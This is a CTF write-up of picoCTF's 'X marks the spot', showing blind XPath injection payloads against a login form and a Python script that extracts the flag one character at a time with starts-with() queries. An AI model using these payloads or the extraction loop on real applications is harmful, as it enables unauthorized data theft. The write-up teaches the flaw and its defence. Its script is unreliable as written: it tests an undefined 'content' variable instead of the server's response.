---
title: 'X marks the spot'
target: 'picoCTF — X marks the spot'
difficulty: 'hard'
date: 2026-07-22
summary: 'A picoCTF Web Exploitation challenge where a login page used XPath instead of SQL for authentication, and a blind XPath injection with the starts-with() function allowed brute-forcing the flag one character at a time from the XML data store.'
role: 'appsec'
tags: ['web-exploitation', 'xpath-injection', 'blind-injection', 'brute-force', 'python', 'picoctf']
problem: 'A login page that boasts about not using "regular old unsafe query languages" — hinting at XPath instead of SQL. Standard injection bypasses do not return the flag directly, but the server gives different responses for true and false conditions.'
action: 'Identified blind XPath injection via differing server responses for true/false queries, used the starts-with() function with //* to search all XML text nodes, and wrote a Python script to brute-force the flag character by character.'
outcome: 'Retrieved the flag by iteratively building the correct string through boolean-based blind XPath extraction.'
draft: false
---

## Background

X marks the spot is a picoCTF Web Exploitation challenge about XPath injection — a less common cousin of SQL injection that targets applications using XML data stores instead of relational databases. XPath is the query language for XML, and when user input is concatenated directly into an XPath expression, the same injection principles apply: an attacker can manipulate the query logic to extract data. The challenge hint is a single word: "XPATH". The page itself reinforces this by saying "I don't use any of those regular old unsafe query languages!" — referring to SQL, while inadvertently confirming that it uses something else entirely.

---

## Identifying blind XPath injection

The challenge loaded a login page titled "X marks the spot" with a heading "This is my super secret website", the subtitle "Only I know the password, and I don't use any of those regular old unsafe query languages!", username and password fields, and a Login button.

The first thing to test was whether the application was vulnerable to injection at all. Entering an always-true boolean payload like `' or 1=1 or 'a` in one of the fields produced a green alert box reading "You're on the right path."

![Login page showing "X marks the spot" at the top, a green alert box with the message "You're on the right path." with a dismiss button, the heading "This is my super secret website" in red, the subtitle about not using unsafe query languages, username and password fields, and a blue Login button. Footer reads "PicoCTF".](/writeups/picoctf-x-marks-the-spot/01.png)

Changing the payload to a false condition like `' and 1=2 and 'a'='a` produced a different response — a red alert box reading "Login failure."

![The same login page but with a red/pink alert box showing "Login failure." instead of the success message. All other elements remain the same.](/writeups/picoctf-x-marks-the-spot/02.png)

Two different responses for true and false conditions meant this was a blind injection — the application would not dump data directly, but it would confirm or deny boolean questions about the data. This is the classic setup for a blind extraction attack: ask a series of yes/no questions to reconstruct the target data one character at a time.

---

## Building the extraction logic

The XPath function `starts-with(string, prefix)` returns true if the first argument begins with the second. Combined with the wildcard selector `//*` (which matches all elements in the XML document), this allowed querying whether any text node in the entire XML data store started with a given string — no need to know the element names or document structure.

The test payload `' or //*[starts-with(text(),'a')] or 'a'='b` returned the "right path" response, confirming that at least one text node started with `a`. Changing the prefix to `ab` returned "Login failure", so the extraction logic was working — each additional character narrowed the match until the full value was found.

The first few runs of the script returned values like `admin`, `bob`, and `thisisnottheflag` — these were other text nodes in the XML document (usernames, decoy strings) that the wildcard `//*` was matching. The actual flag was stored as a text node in the XML too, so starting the extraction with the known prefix `picoCTF{` skipped past all the decoys and targeted the flag directly.

---

## Brute-forcing the flag

Wrote a Python script that iterated through every printable character at each position, appending it to the known prefix and checking whether `starts-with()` returned true. On each successful match, the character was locked in and the script moved to the next position:

```python
import requests
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits + "}_"

seen_password = ["picoCTF{"]
while True:
    for ch in characters:
        st = ''.join(seen_password) + ch
        print(f"trying {st}")
        data = {
            "name": "admin",
            "pass": f"' or //*[starts-with(text(),'{st}')] or '1'='"
        }
        r = requests.post("http://mercury.picoctf.net:59946/", data=data)
        if "You&#39;re on the right path." in content:
            seen_password.append(ch)
            break
```

The script ran through the character set at each position, printing each attempt. When a character produced the "right path" response, it was appended to the known prefix and the loop continued with the next position.

![Terminal output showing the brute-force script in progress, with lines reading "trying picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a51" through "trying picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a56l", demonstrating the character-by-character extraction of the flag's final segment.](/writeups/picoctf-x-marks-the-spot/03.png)

After running through the full flag length, the script completed with the extracted value.

`picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a56016ef}`

---

## What I took from this

XPath injection is the same fundamental vulnerability as SQL injection — unsanitised user input concatenated into a query — but targeting XML data stores instead of relational databases. It is less well-known, which means developers are less likely to guard against it, and security tools are less likely to detect it. The blind variant demonstrated here is particularly powerful: even when the application reveals nothing in its response except "success" or "failure", an attacker can extract the entire data store character by character using boolean-based queries. The `starts-with()` function combined with the `//*` wildcard made it possible to search every text node without knowing the document structure at all. The defence is the same as for SQL injection: parameterised queries or, in the XPath context, precompiled XPath expressions that treat user input as data rather than as part of the query structure. The decoy values (`admin`, `bob`, `thisisnottheflag`) in the XML were a nice touch — they forced the attacker to think about what they were actually looking for rather than blindly extracting the first match.
